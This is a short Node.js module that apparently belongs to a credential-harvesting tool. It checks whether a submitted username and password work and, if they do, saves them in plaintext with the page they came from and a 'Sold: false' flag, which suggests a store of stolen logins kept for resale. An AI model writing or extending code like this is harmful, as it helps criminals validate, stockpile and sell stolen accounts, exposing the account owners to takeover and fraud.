const { account } = require('../database/models');

const { areCredentialsOk } = require('./test_user');

const checkAndStore = async (username, password, url) => {
  const validCredentials = await areCredentialsOk(username, password, false);
  if (!validCredentials) return;
  account.save({
    UserName: username,
    Password: password,
    FromUrl: url,
    Sold: false
  });
};

module.exports = { checkAndStore };
